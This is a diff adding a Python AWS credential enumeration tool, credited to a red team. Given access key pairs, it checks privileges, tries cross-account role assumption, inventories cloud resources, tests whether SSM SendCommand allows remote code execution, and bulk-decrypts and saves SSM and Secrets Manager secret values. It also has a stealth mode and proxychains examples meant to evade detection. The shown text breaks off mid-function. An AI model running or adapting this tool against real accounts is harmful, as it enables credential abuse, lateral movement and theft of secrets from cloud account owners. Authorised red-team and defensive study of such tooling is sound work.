@@ -1,0 +1,1479 @@
+#!/usr/bin/env python3
+"""
+aws_enum.py — AWS Credential Enumerator
+Given AWS key:secret pairs, performs full identity, privilege, and
+resource enumeration. Attempts to assume a configurable role across
+a configurable list of AWS accounts.
+
+Usage:
+    python3 aws_enum.py -c KEY_ID:SECRET
+    python3 aws_enum.py -f creds.txt
+    python3 aws_enum.py -c KEY_ID:SECRET:SESSION_TOKEN --pull-secrets
+    proxychains python3 aws_enum.py -f creds.txt -o /tmp/results.json
+
+Input file format (one per line):
+    AKIAXXXXXXXXXXXXXXXX:secretkeyhere
+    AKIAXXXXXXXXXXXXXXXX:secretkeyhere:optionalsessiontoken
+    # Comments and blank lines ignored
+
+Author: Bishop Fox Red Team
+"""
+
+import boto3
+import botocore
+import argparse
+import sys
+import json
+import os
+from datetime import datetime, timezone
+from botocore.config import Config
+
+import urllib3
+import random
+import time as _time
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+def jitter(stealth=False, min_s=0.5, max_s=2.5):
+    """Sleep a random amount if stealth mode is on"""
+    if stealth:
+        _time.sleep(random.uniform(min_s, max_s))
+
+DEFAULT_ROLE_NAME = "atmos-bootstrap-role"
+
+PRIV_CHECKS = [
+    "iam:GetUser", "iam:ListUsers", "iam:ListRoles", "iam:ListPolicies",
+    "iam:ListAttachedUserPolicies", "iam:ListUserPolicies", "iam:GetUserPolicy",
+    "iam:SimulatePrincipalPolicy", "iam:CreateUser", "iam:CreateAccessKey",
+    "iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:CreateLoginProfile",
+    "iam:PassRole", "iam:UpdateAssumeRolePolicy",
+    "sts:AssumeRole", "sts:GetFederationToken", "sts:GetSessionToken",
+    "s3:ListAllMyBuckets", "s3:GetObject", "s3:PutObject",
+    "s3:DeleteObject", "s3:GetBucketPolicy", "s3:PutBucketPolicy",
+    "ec2:DescribeInstances", "ec2:DescribeSecurityGroups",
+    "ec2:DescribeVpcs", "ec2:RunInstances", "ec2:DescribeImages",
+    "eks:ListClusters", "eks:DescribeCluster", "eks:CreateCluster", "eks:DeleteCluster",
+    "ecr:DescribeRepositories", "ecr:GetAuthorizationToken", "ecr:BatchGetImage",
+    "lambda:ListFunctions", "lambda:InvokeFunction", "lambda:UpdateFunctionCode",
+    "ssm:DescribeInstanceInformation", "ssm:SendCommand",
+    "ssm:GetParameter", "ssm:GetParameters", "ssm:DescribeParameters",
+    "ssm:PutParameter", "ssm:DeleteParameter",
+    "secretsmanager:ListSecrets", "secretsmanager:GetSecretValue",
+    "secretsmanager:PutSecretValue", "secretsmanager:CreateSecret",
+    "rds:DescribeDBInstances", "rds:DescribeDBClusters",
+    "dynamodb:ListTables", "dynamodb:Scan", "dynamodb:GetItem",
+    "cloudformation:ListStacks", "cloudformation:GetTemplate",
+    "organizations:DescribeOrganization", "organizations:ListAccounts",
+    "logs:DescribeLogGroups", "logs:FilterLogEvents",
+    "sts:GetCallerIdentity",
+]
+
+ALL_REGIONS = [
+    "us-east-1", "us-east-2", "us-west-1", "us-west-2",
+    "eu-west-1", "eu-west-2", "eu-central-1", "eu-central-2",
+    "ap-southeast-1", "ap-southeast-2", "ap-northeast-1",
+    "sa-east-1", "ca-central-1", "af-south-1",
+]
+
+DEFAULT_REGIONS = ["us-east-1", "us-east-2", "us-west-2", "eu-central-1", "ap-southeast-1"]
+
+
+def ts():
+    return datetime.now().strftime("%H:%M:%S")
+
+
+def banner():
+    print("""
+  \033[36m\033[1m╔═══════════════════════════════════════════════════╗
+  ║   █████╗ ██╗    ██╗███████╗    ███████╗███╗  ██╗  ║
+  ║  ██╔══██╗██║    ██║██╔════╝    ██╔════╝████╗ ██║  ║
+  ║  ███████║██║ █╗ ██║███████╗    █████╗  ██╔██╗██║  ║
+  ║  ██╔══██║██║███╗██║╚════██║    ██╔══╝  ██║╚████║  ║
+  ║  ██║  ██║╚███╔███╔╝███████║    ███████╗██║ ╚███║  ║
+  ║  ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝    ╚══════╝╚═╝  ╚══╝  ║
+  ║   AWS Credential Enumerator  //  red team only     ║
+  ╚═══════════════════════════════════════════════════╝\033[0m
+""")
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="AWS credential enumerator with priv checks and role assumption",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  Single credential:
+    python3 aws_enum.py -c AKIAXXXXXXXX:secretkey
+
+  With session token:
+    python3 aws_enum.py -c AKIAXXXXXXXX:secretkey:sessiontoken
+
+  From file:
+    python3 aws_enum.py -f creds.txt
+
+  Pull actual SSM/SM secret values (default: names only):
+    python3 aws_enum.py -f creds.txt --pull-secrets
+
+  Try role in specific accounts:
+    python3 aws_enum.py -f creds.txt --accounts 123456789012,987654321098
+
+  Accounts with aliases:
+    python3 aws_enum.py -f creds.txt --accounts 123456789012:prod,987654321098:staging
+
+  Load accounts from file (ID or ID:alias per line):
+    python3 aws_enum.py -f creds.txt --accounts-file accounts.txt
+
+  Custom role name:
+    python3 aws_enum.py -f creds.txt --role-name my-admin-role
+
+  Scan all AWS regions for EKS:
+    python3 aws_enum.py -f creds.txt --all-regions
+
+  Skip role assumption:
+    python3 aws_enum.py -f creds.txt --no-assume
+
+  Fast mode (skip priv simulation):
+    python3 aws_enum.py -f creds.txt --fast
+
+  With proxychains:
+    proxychains python3 aws_enum.py -f creds.txt -o /tmp/results.json
+        """
+    )
+
+    inp = parser.add_argument_group("Input")
+    inp.add_argument("-c", "--cred",
+                     help="Single credential: KEY_ID:SECRET or KEY_ID:SECRET:TOKEN")
+    inp.add_argument("-f", "--file",
+                     help="File with credentials, one per line (KEY:SECRET[:TOKEN])")
+
+    opts = parser.add_argument_group("Options")
+    opts.add_argument("-r", "--region", default="us-east-1",
+                      help="Anchor region for STS/role assumption calls (default: us-east-1). "
+                           "All resource checks (EKS, SSM, SM, ECR, RDS, Lambda, EC2) run across all regions regardless.")
+    opts.add_argument("--all-regions", action="store_true",
+                      help="Check all AWS regions for EKS/ECR (slower)")
+    opts.add_argument("--fast", action="store_true",
+                      help="Skip IAM privilege simulation")
+    opts.add_argument("--stealth", action="store_true",
+                      help="Stealth mode — skips noisy checks (simulate_principal_policy, "
+                           "SendCommand test, cross-account role attempts), adds random jitter "
+                           "between API calls (0.5-2.5s). Slower but quieter.")
+    opts.add_argument("--timeout", type=int, default=10,
+                      help="Request timeout in seconds (default: 10)")
+
+    assume = parser.add_argument_group("Role Assumption")
+    assume.add_argument("--no-assume", action="store_true",
+                        help="Skip role assumption entirely")
+    assume.add_argument("--role-name", default=DEFAULT_ROLE_NAME,
+                        help=f"Role name to attempt assumption (default: {DEFAULT_ROLE_NAME})")
+    assume.add_argument("--accounts",
+                        help="Comma-separated account IDs (or ID:alias) to try role assumption in. "
+                             "Always includes own account. "
+                             "Example: 123456789012,987654321098:staging")
+    assume.add_argument("--accounts-file",
+                        help="File with account IDs, one per line (ID or ID:alias)")
+
+    secrets = parser.add_argument_group("Secrets")
+    secrets.add_argument("--pull-secrets", action="store_true",
+                         help="Pull actual secret values from SSM and Secrets Manager "
+                              "(default: list names only, no values)")
+
+    out = parser.add_argument_group("Output")
+    out.add_argument("-o", "--output",
+                     nargs="?", const="__auto__",
+                     help="Save full JSON results to this path. "
+                          "Use -o alone to auto-name as <out-dir>/<key_id>.json (default behavior)")
+    out.add_argument("--out-dir", default=None,
+                     help="Output directory (default: ./aws_enum_<timestamp> in CWD)")
+
+    args = parser.parse_args()
+
+    if not args.cred and not args.file:
+        parser.error("Provide --cred or --file")
+
+    return args
+
+
+def load_accounts(args):
+    accounts = {}
+
+    if args.accounts:
+        for entry in args.accounts.split(","):
+            entry = entry.strip()
+            if ":" in entry:
+                account_id, alias = entry.split(":", 1)
+            else:
+                account_id, alias = entry, entry
+            accounts[account_id.strip()] = alias.strip()
+
+    if getattr(args, "accounts_file", None) and os.path.exists(args.accounts_file):
+        with open(args.accounts_file) as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                if ":" in line:
+                    account_id, alias = line.split(":", 1)
+                else:
+                    account_id, alias = line, line
+                accounts[account_id.strip()] = alias.strip()
+
+    return accounts
+
+
+def make_client(service, key_id, secret, token=None, region="us-east-1", timeout=10):
+    config = Config(
+        connect_timeout=timeout,
+        read_timeout=timeout,
+        retries={"max_attempts": 1}
+    )
+    kwargs = dict(
+        service_name=service,
+        region_name=region,
+        aws_access_key_id=key_id,
+        aws_secret_access_key=secret,
+        config=config
+    )
+    if token:
+        kwargs["aws_session_token"] = token
+    return boto3.client(**kwargs)
+
+
+def safe(func, *args, **kwargs):
+    try:
+        return func(*args, **kwargs), None
+    except botocore.exceptions.ClientError as e:
+        return None, e.response["Error"]["Code"]
+    except Exception as e:
+        return None, f"{type(e).__name__}: {e}"
+
+
+# ─── Checks ───────────────────────────────────────────────────────────────────
+
+def check_identity(key_id, secret, token, region, timeout):
+    client = make_client("sts", key_id, secret, token, region, timeout)
+    result, err = safe(client.get_caller_identity)
+    if err:
+        return None, err
+
+    # Get account alias
+    iam = make_client("iam", key_id, secret, token, region, timeout)
+    aliases, _ = safe(iam.list_account_aliases)
+    alias = aliases["AccountAliases"][0] if aliases and aliases.get("AccountAliases") else None
+
+    return {
+        "user_id": result["UserId"],
+        "account": result["Account"],
+        "account_alias": alias,
+        "arn": result["Arn"],
+        "key_type": "ASIA (temporary/role)" if key_id.startswith("ASIA") else "AKIA (long-term/user)",
+        "is_role": ":assumed-role/" in result["Arn"],
+        "is_root": ":root" in result["Arn"],
+    }, None
+
+
+def check_iam(key_id, secret, token, region, timeout, identity):
+    client = make_client("iam", key_id, secret, token, region, timeout)
+    result = {}
+
+    arn = identity["arn"]
+    username = arn.split("/")[-1] if "/" in arn and not identity.get("is_role") else None
+
+    if not identity.get("is_role") and username:
+        user, _ = safe(client.get_user, UserName=username)
+        if user:
+            u = user["User"]
+            result["username"] = u.get("UserName")
+            result["created"] = str(u.get("CreateDate", ""))
+            result["password_last_used"] = str(u.get("PasswordLastUsed", "Never"))
+            result["tags"] = u.get("Tags", [])
+
+        for call, key in [
+            (lambda: safe(client.list_attached_user_policies, UserName=username), "attached_policies"),
+            (lambda: safe(client.list_user_policies, UserName=username), "inline_policies"),
+            (lambda: safe(client.list_groups_for_user, UserName=username), "groups"),
+            (lambda: safe(client.list_access_keys, UserName=username), "access_keys"),
+        ]:
+            res, _ = call()
+            if res:
+                if key == "attached_policies":
+                    result[key] = [p["PolicyName"] for p in res.get("AttachedPolicies", [])]
+                elif key == "inline_policies":
+                    result[key] = res.get("PolicyNames", [])
+                elif key == "groups":
+                    result[key] = [g["GroupName"] for g in res.get("Groups", [])]
+                elif key == "access_keys":
+                    result[key] = [
+                        {"key_id": k["AccessKeyId"], "status": k["Status"],
+                         "created": str(k["CreateDate"])}
+                        for k in res.get("AccessKeyMetadata", [])
+                    ]
+
+    roles, _ = safe(client.list_roles, MaxItems=100)
+    if roles:
+        result["visible_roles"] = [r["RoleName"] for r in roles.get("Roles", [])]
+
+    users, _ = safe(client.list_users, MaxItems=100)
+    if users:
+        result["visible_users"] = [u["UserName"] for u in users.get("Users", [])]
+
+    return result
+
+
+def check_privs(key_id, secret, token, region, timeout, identity):
+    if identity.get("is_root"):
+        return {"note": "Root — all actions allowed"}
+    client = make_client("iam", key_id, secret, token, region, timeout)
+    result, err = safe(
+        client.simulate_principal_policy,
+        PolicySourceArn=identity["arn"],
+        ActionNames=PRIV_CHECKS
+    )
+    if err:
+        return {"error": err}
+
+    allowed, denied = [], []
+    for r in result.get("EvaluationResults", []):
+        (allowed if r["EvalDecision"] == "allowed" else denied).append(r["EvalActionName"])
+
+    high_value = [a for a in allowed if any(h in a for h in [
+        "iam:Create", "iam:Put", "iam:Attach", "iam:PassRole", "iam:Update",
+        "sts:AssumeRole", "s3:PutBucketPolicy", "ec2:RunInstances",
+        "lambda:UpdateFunctionCode", "lambda:Invoke",
+        "ssm:SendCommand", "ssm:PutParameter",
+        "secretsmanager:GetSecretValue", "secretsmanager:PutSecretValue",
+        "eks:Create", "eks:Delete", "organizations:ListAccounts",
+    ])]
+
+    return {"allowed": allowed, "denied_count": len(denied), "high_value": high_value}
+
+
+def check_s3(key_id, secret, token, region, timeout):
+    client = make_client("s3", key_id, secret, token, region, timeout)
+    result, err = safe(client.list_buckets)
+    if err:
+        return {"error": err}
+    names = [b["Name"] for b in result.get("Buckets", [])]
+    return {
+        "total": len(names),
+        "terraform_buckets": [b for b in names if "terraform" in b.lower()],
+        "backup_buckets": [b for b in names if any(kw in b.lower()
+                           for kw in ["backup", "velero", "snapshot"])],
+        "log_buckets": [b for b in names if any(kw in b.lower()
+                        for kw in ["log", "audit", "access"])],
+        "all": names
+    }
+
+
+def check_ec2(key_id, secret, token, region, timeout):
+    client = make_client("ec2", key_id, secret, token, region, timeout)
+    result = {}
+
+    instances, _ = safe(client.describe_instances)
+    if instances:
+        running = []
+        for r in instances.get("Reservations", []):
+            for i in r.get("Instances", []):
+                if i.get("State", {}).get("Name") == "running":
+                    running.append({
+                        "id": i["InstanceId"],
+                        "type": i.get("InstanceType"),
+                        "private_ip": i.get("PrivateIpAddress"),
+                        "public_ip": i.get("PublicIpAddress"),
+                        "name": next((t["Value"] for t in i.get("Tags", [])
+                                      if t["Key"] == "Name"), ""),
+                        "iam_profile": i.get("IamInstanceProfile", {}).get("Arn", "")
+                    })
+        result["running_instances"] = running
+        result["running_count"] = len(running)
+
+    vpcs, _ = safe(client.describe_vpcs)
+    if vpcs:
+        result["vpcs"] = [
+            {"id": v["VpcId"], "cidr": v["CidrBlock"], "default": v["IsDefault"],
+             "name": next((t["Value"] for t in v.get("Tags", [])
+                           if t["Key"] == "Name"), "")}
+            for v in vpcs.get("Vpcs", [])
+        ]
+
+    return result
+
+
+def check_eks(key_id, secret, token, timeout, regions):
+    """Enumerate EKS clusters via list-clusters API across regions"""
+    clusters = {}
+    for region in regions:
+        client = make_client("eks", key_id, secret, token, region, timeout)
+        result, err = safe(client.list_clusters)
+        if result and result.get("clusters"):
+            cluster_list = result["clusters"]
+            clusters[region] = cluster_list
+            details = {}
+            for name in cluster_list:
+                desc, _ = safe(client.describe_cluster, name=name)
+                if desc:
+                    cl = desc["cluster"]
+                    details[name] = {
+                        "status": cl.get("status"),
+                        "version": cl.get("version"),
+                        "endpoint": cl.get("endpoint"),
+                        "role_arn": cl.get("roleArn"),
+                        "k8s_network": cl.get("kubernetesNetworkConfig", {}),
+                    }
+            clusters[f"{region}_details"] = details
+    return clusters
+
+
+def check_ecr(key_id, secret, token, region, timeout):
+    client = make_client("ecr", key_id, secret, token, region, timeout)
+    repos = []
+    try:
+        paginator = client.get_paginator("describe_repositories")
+        for page in paginator.paginate():
+            for r in page.get("repositories", []):
+                repos.append({
+                    "name": r["repositoryName"],
+                    "uri": r["repositoryUri"],
+                    "created": str(r.get("createdAt", "")),
+                })
+    except Exception:
+        r, _ = safe(client.describe_repositories)
+        if r:
+            repos = [{"name": x["repositoryName"], "uri": x["repositoryUri"]}
+                     for x in r.get("repositories", [])]
+    return {"total": len(repos), "repos": repos}
+
+
+def check_ssm(key_id, secret, token, region, timeout,
+              pull_secrets=False, out_dir="/tmp", account_id="unknown", stealth=False):
+    client = make_client("ssm", key_id, secret, token, region, timeout)
+    result = {}
+
+    # Managed instances
+    instances, err = safe(client.describe_instance_information)
+    if instances:
+        inst_list = [
+            {
+                "id": i["InstanceId"],
+                "ip": i.get("IPAddress", ""),
+                "platform": f"{i.get('PlatformName','')} {i.get('PlatformVersion','')}".strip(),
+                "ping": i.get("PingStatus", ""),
+                "agent_version": i.get("AgentVersion", ""),
+            }
+            for i in instances.get("InstanceInformationList", [])
+        ]
+        result["managed_instances"] = inst_list
+        result["managed_instances_count"] = len(inst_list)
+    else:
+        result["managed_instances_count"] = 0
+        result["managed_instances_error"] = err
+
+    # List all parameter names
+    all_params = []
+    try:
+        paginator = client.get_paginator("describe_parameters")
+        for page in paginator.paginate():
+            all_params.extend(page.get("Parameters", []))
+    except Exception:
+        p, _ = safe(client.describe_parameters, MaxResults=50)
+        if p:
+            all_params = p.get("Parameters", [])
+
+    param_names = [p["Name"] for p in all_params]
+    param_types = {p["Name"]: p.get("Type", "") for p in all_params}
+    result["parameter_count"] = len(param_names)
+    result["parameter_names"] = param_names
+    result["secure_string_count"] = sum(1 for t in param_types.values() if t == "SecureString")
+
+    # Save names to file
+    if param_names:
+        names_file = os.path.join(out_dir, f"ssm_params_{account_id}_{region}.txt")
+        with open(names_file, "w") as f:
+            f.write(f"SSM Parameters — Account {account_id} / Region {region}\n")
+            f.write(f"Total: {len(param_names)} | SecureString: {result['secure_string_count']}\n")
+            f.write("=" * 60 + "\n\n")
+            for name in sorted(param_names):
+                ptype = param_types.get(name, "")
+                f.write(f"[{ptype:14s}] {name}\n")
+        result["params_file"] = names_file
+        print(f"    [{ts()}]   SSM names saved → {names_file}", flush=True)
+
+    # Optionally pull values
+    if pull_secrets and param_names:
+        values_file = os.path.join(out_dir, f"ssm_secrets_{account_id}_{region}.txt")
+        readable = {}
+        print(f"    [{ts()}]   Pulling {len(param_names)} SSM values...", flush=True)
+        for name in param_names:
+            val, _ = safe(client.get_parameter, Name=name, WithDecryption=True)
+            if val:
+                readable[name] = {
+                    "value": val["Parameter"]["Value"],
+                    "type": val["Parameter"]["Type"],
+                }
+        with open(values_file, "w") as f:
+            f.write(f"SSM Secrets — Account {account_id} / Region {region}\n")
+            f.write(f"Readable: {len(readable)}/{len(param_names)}\n")
+            f.write("=" * 60 + "\n\n")
+            for name, data in sorted(readable.items()):
+                f.write(f"[{data['type']:14s}] {name}\n  VALUE: {data['value']}\n\n")
+        result["secrets_file"] = values_file
+        result["readable_count"] = len(readable)
+        print(f"    [{ts()}]   SSM values ({len(readable)} readable) → {values_file}", flush=True)
+
+    # Test GetParameter access
+    if param_names:
+        val, err = safe(client.get_parameter, Name=param_names[0], WithDecryption=True)
+        result["get_parameter_access"] = "ALLOWED" if val else f"DENIED — {err}"
+    else:
+        result["get_parameter_access"] = "NOT TESTED"
+
+    # Test SendCommand (IAM check via fake instance) — skip in stealth mode
+    if stealth:
+        result["send_command_access"] = "SKIPPED (stealth mode)"
+    elif result.get("managed_instances_count", 0) > 0:
+        _, err = safe(
+            client.send_command,
+            InstanceIds=["i-00000000000000000"],
+            DocumentName="AWS-RunShellScript",
+            Parameters={"commands": ["id"]}
+        )
+        if err is None:
+            result["send_command_access"] = "ALLOWED — RCE POSSIBLE"
+        elif "InvalidInstanceId" in str(err):
+            result["send_command_access"] = "ALLOWED — RCE POSSIBLE (IAM permits)"
+        elif "AccessDenied" in str(err) or "UnauthorizedOperation" in str(err):
+            result["send_command_access"] = "DENIED"
+        else:
+            result["send_command_access"] = f"UNKNOWN — {err}"
+    else:
+        result["send_command_access"] = "NOT TESTED — no managed instances"
+
+    return result
+
+
+def check_secrets_manager(key_id, secret, token, region, timeout,
+                           pull_secrets=False, out_dir="/tmp", account_id="unknown"):
+    client = make_client("secretsmanager", key_id, secret, token, region, timeout)
+    all_secrets = []
+    try:
+        paginator = client.get_paginator("list_secrets")
+        for page in paginator.paginate():
+            all_secrets.extend(page.get("SecretList", []))
+    except Exception:
+        r, err = safe(client.list_secrets, MaxResults=100)
+        if r:
+            all_secrets = r.get("SecretList", [])
+        else:
+            return {"error": err}
+
+    secret_names = [s["Name"] for s in all_secrets]
+    result = {"total": len(secret_names), "secret_names": secret_names}
+
+    if secret_names:
+        names_file = os.path.join(out_dir, f"sm_names_{account_id}_{region}.txt")
+        with open(names_file, "w") as f:
+            f.write(f"Secrets Manager — Account {account_id} / Region {region}\n")
+            f.write(f"Total: {len(secret_names)}\n")
+            f.write("=" * 60 + "\n\n")
+            for s in all_secrets:
+                f.write(f"{s['Name']}\n")
+                if s.get("Description"):
+                    f.write(f"  Description  : {s['Description']}\n")
+                f.write(f"  Last changed : {s.get('LastChangedDate','N/A')}\n\n")
+        result["names_file"] = names_file
+        print(f"    [{ts()}]   SM names saved → {names_file}", flush=True)
+
+    if pull_secrets and secret_names:
+        values_file = os.path.join(out_dir, f"sm_secrets_{account_id}_{region}.txt")
+        readable = {}
+        for name in secret_names:
+            val, _ = safe(client.get_secret_value, SecretId=name)
+            if val:
+                readable[name] = val.get("SecretString") or str(val.get("SecretBinary", ""))
+        with open(values_file, "w") as f:
+            f.write(f"Secrets Manager Values — Account {account_id} / Region {region}\n")
+            f.write(f"Readable: {len(readable)}/{len(secret_names)}\n")
+            f.write("=" * 60 + "\n\n")
+            for name, value in sorted(readable.items()):
+                f.write(f"{name}\n  VALUE: {value}\n\n")
+        result["values_file"] = values_file
+        result["readable_count"] = len(readable)
+        print(f"    [{ts()}]   SM values ({len(readable)} readable) → {values_file}", flush=True)
+
+    return result
+
+
+def check_org(key_id, secret, token, region, timeout):
+    # Organizations API must target us-east-1 regardless of primary region
+    client = make_client("organizations", key_id, secret, token, "us-east-1", timeout)
+    org, err = safe(client.describe_organization)
+    if err:
+        return {"error": err}
+    o = org["Organization"]
+    result = {
+        "org_id": o.get("Id"),
+        "master_account": o.get("MasterAccountId"),
+        "master_email": o.get("MasterAccountEmail"),
+        "feature_set": o.get("FeatureSet"),
+    }
+    # List all accounts using safe() per page
+    all_accounts = []
+    next_token = None
+    while True:
+        kwargs = {"MaxResults": 20}
+        if next_token:
+            kwargs["NextToken"] = next_token
+        page, err = safe(client.list_accounts, **kwargs)
+        if err:
+            result["accounts_error"] = err
+            break
+        all_accounts.extend(page.get("Accounts", []))
+        next_token = page.get("NextToken")
+        if not next_token:
+            break
+    if all_accounts:
+        result["accounts"] = [
+            {"id": a["Id"], "name": a["Name"],
+             "email": a["Email"], "status": a["Status"]}
+            for a in all_accounts
+        ]
+        result["account_count"] = len(all_accounts)
+    return result
+
+
+def check_rds(key_id, secret, token, region, timeout):
+    client = make_client("rds", key_id, secret, token, region, timeout)
+    result = {}
+    instances, _ = safe(client.describe_db_instances)
+    if instances:
+        result["instances"] = [
+            {
+                "id": i["DBInstanceIdentifier"],
+                "engine": f"{i['Engine']} {i.get('EngineVersion','')}",
+                "status": i["DBInstanceStatus"],
+                "endpoint": i.get("Endpoint", {}).get("Address", ""),
+                "port": i.get("Endpoint", {}).get("Port", ""),
+                "publicly_accessible": i.get("PubliclyAccessible", False),
+            }
+            for i in instances.get("DBInstances", [])
+        ]
+    clusters, _ = safe(client.describe_db_clusters)
+    if clusters:
+        result["clusters"] = [
+            {
+                "id": c["DBClusterIdentifier"],
+                "engine": f"{c['Engine']} {c.get('EngineVersion','')}",
+                "status": c["Status"],
+                "endpoint": c.get("Endpoint", ""),
+            }
+            for c in clusters.get("DBClusters", [])
+        ]
+    return result
+
+
+def check_lambda(key_id, secret, token, region, timeout):
+    client = make_client("lambda", key_id, secret, token, region, timeout)
+    functions = []
+    try:
+        paginator = client.get_paginator("list_functions")
+        for page in paginator.paginate():
+            for fn in page.get("Functions", []):
+                functions.append({
+                    "name": fn["FunctionName"],
+                    "runtime": fn.get("Runtime", ""),
+                    "role": fn.get("Role", ""),
+                })
+    except Exception:
+        r, _ = safe(client.list_functions)
+        if r:
+            functions = [{"name": f["FunctionName"]} for f in r.get("Functions", [])]
+    return {"total": len(functions), "functions": functions}
+
+
+def check_logs(key_id, secret, token, region, timeout):
+    client = make_client("logs", key_id, secret, token, region, timeout)
+    result, err = safe(client.describe_log_groups, limit=50)
+    if err:
+        return {"error": err}
+    return {"total": len(result.get("logGroups", [])),
+            "log_groups": [g["logGroupName"] for g in result.get("logGroups", [])]}
+
+
+def try_assume_role(key_id, secret, token, region, timeout, role_name, account_id):
+    """Try to assume a single role, return credentials tuple or None"""
+    sts = make_client("sts", key_id, secret, token, region, timeout)
+    role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
+    assumed, err = safe(sts.assume_role, RoleArn=role_arn,
+                        RoleSessionName="aws", DurationSeconds=3600)
+    if assumed:
+        c = assumed["Credentials"]
+        return c["AccessKeyId"], c["SecretAccessKey"], c["SessionToken"], role_arn
+    return None
+
+
+def count_allowed(privs):
+    """Return count of allowed actions from simulate result"""
+    if not privs or "allowed" not in privs:
+        return 0
+    return len(privs["allowed"])
+
+
+def session_arn_to_role_arn(arn):
+    """
+    Convert assumed-role session ARN to role ARN for simulate_principal_policy.
+    arn:aws:sts::ACCT:assumed-role/ROLE/SESSION → arn:aws:iam::ACCT:role/ROLE
+    """
+    import re
+    m = re.match(r"arn:aws:sts::(\d+):assumed-role/([^/]+)/", arn)
+    if m:
+        return f"arn:aws:iam::{m.group(1)}:role/{m.group(2)}"
+    return arn
+
+
+def pick_best_credential(base_key, base_secret, base_token,
+                          region, timeout, role_name,
+                          extra_accounts, source_account, fast):
+    """
+    Try to assume role_name in own account + extra_accounts.
+    Run privilege simulation on base cred and each successful assumption.
+    Return (key_id, secret, token, label, assumed_arn) for the most privileged.
+    """
+    candidates = []
+
+    # Base credential
+    base_identity, _ = check_identity(base_key, base_secret, base_token, region, timeout)
+    base_label = f"base ({base_key[:16]}...)"
+    base_allowed = 0
+
+    if not fast and base_identity:
+        base_privs = check_privs(base_key, base_secret, base_token, region, timeout, base_identity)
+        base_allowed = count_allowed(base_privs)
+
+    candidates.append({
+        "key_id": base_key,
+        "secret": base_secret,
+        "token": base_token,
+        "label": base_label,
+        "arn": base_identity["arn"] if base_identity else "unknown",
+        "allowed": base_allowed,
+        "is_base": True,
+    })
+
+    # Try role in own account + extras
+    all_accounts = dict(extra_accounts)
+    if source_account not in all_accounts:
+        all_accounts[source_account] = f"account-{source_account}"
+
+    for acct_id, alias in all_accounts.items():
+        print(f"  [{ts()}]   Trying {role_name} @ {alias} ({acct_id})...", flush=True)
+        creds = try_assume_role(base_key, base_secret, base_token,
+                                region, timeout, role_name, acct_id)
+        if not creds:
+            print(f"  [{ts()}]     ✗ Denied", flush=True)
+            continue
+        print(f"  [{ts()}]     ✓ Assumed", flush=True)
+        ak, sk, st, role_arn = creds
+        assumed_identity, _ = check_identity(ak, sk, st, region, timeout)
+        assumed_allowed = 0
+        if not fast and assumed_identity:
+            # Use role ARN not session ARN for simulate_principal_policy
+            sim_identity = dict(assumed_identity)
+            sim_identity["arn"] = session_arn_to_role_arn(assumed_identity["arn"])
+            assumed_privs = check_privs(ak, sk, st, region, timeout, sim_identity)
+            assumed_allowed = count_allowed(assumed_privs)
+            if assumed_allowed == 0 and "error" in assumed_privs:
+                print(f"    [{ts()}]   ⚠ Priv sim failed for assumed role: {assumed_privs['error']}", flush=True)
+                # Fall back to counting accessible services directly
+                s3_test, _ = safe(make_client("s3", ak, sk, st, region, timeout).list_buckets)
+                eks_test, _ = safe(make_client("eks", ak, sk, st, "us-west-2", timeout).list_clusters)
+                ssm_test, _ = safe(make_client("ssm", ak, sk, st, region, timeout).describe_parameters)
+                assumed_allowed = sum([
+                    50 if s3_test else 0,
+                    20 if eks_test else 0,
+                    10 if ssm_test else 0,
+                ])
+                print(f"    [{ts()}]   ↳ Estimated allowed (service probes): {assumed_allowed}", flush=True)
+
+        candidates.append({
+            "key_id": ak,
+            "secret": sk,
+            "token": st,
+            "label": f"{role_name} @ {alias} ({acct_id})",
+            "arn": assumed_identity["arn"] if assumed_identity else role_arn,
+            "allowed": assumed_allowed,
+            "is_base": False,
+            "account_id": acct_id,
+            "account_alias": alias,
+        })
+
+    # Pick the one with most allowed actions
+    best = max(candidates, key=lambda x: x["allowed"])
+
+    print(f"[{ts()}]   Privilege comparison:", flush=True)
+    for c in candidates:
+        marker = "★" if c == best else " "
+        alias_str = f" [{c.get('account_alias','')}]" if c.get('account_alias') else ""
+        print(f"[{ts()}]   {marker} {c['label']:50s}{alias_str} — {c['allowed']} allowed actions", flush=True)
+
+    if best["is_base"]:
+        print(f"[{ts()}]   → Using base credential (highest privilege)", flush=True)
+    else:
+        print(f"[{ts()}]   → Using assumed role: {best['label']} (higher privilege)", flush=True)
+
+    return (best["key_id"], best["secret"], best["token"],
+            best["label"], best["arn"], candidates)
+
+
+# ─── Role assumption with full sub-enumeration ────────────────────────────────
+
+def attempt_role_assumption(key_id, secret, token, region, timeout,
+                             role_name, accounts, source_account,
+                             pull_secrets, out_dir):
+    sts = make_client("sts", key_id, secret, token, region, timeout)
+    results = {}
+
+    all_accounts = dict(accounts)
+    if source_account and source_account not in all_accounts:
+        all_accounts[source_account] = f"account-{source_account}"
+
+    print(f"    [{ts()}] Testing {role_name} in {len(all_accounts)} account(s)...", flush=True)
+
+    for account_id, alias in all_accounts.items():
+        role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
+        cross = "(cross)" if account_id != source_account else "(own)"
+        print(f"    [{ts()}]   {alias} ({account_id}) {cross}...", flush=True)
+
+        assumed, err = safe(
+            sts.assume_role,
+            RoleArn=role_arn,
+            RoleSessionName="aws",
+            DurationSeconds=3600
+        )
+
+        if assumed:
+            c = assumed["Credentials"]
+            ak, sk, st = c["AccessKeyId"], c["SecretAccessKey"], c["SessionToken"]
+
+            assumed_identity, _ = check_identity(ak, sk, st, region, timeout)
+
+            entry = {
+                "status": "SUCCESS",
+                "account_alias": alias,
+                "cross_account": account_id != source_account,
+                "role_arn": role_arn,
+                "assumed_arn": assumed_identity["arn"] if assumed_identity else "unknown",
+                "access_key_id": ak,
+                "expiration": str(c["Expiration"]),
+                "eks_clusters": {},
+                "s3": {},
+                "ssm": {},
+                "secrets_manager": {}
+            }
+
+            # EKS
+            print(f"    [{ts()}]     EKS...", flush=True)
+            for r in DEFAULT_REGIONS:
+                eks_c = make_client("eks", ak, sk, st, r, timeout)
+                eks_r, _ = safe(eks_c.list_clusters)
+                if eks_r and eks_r.get("clusters"):
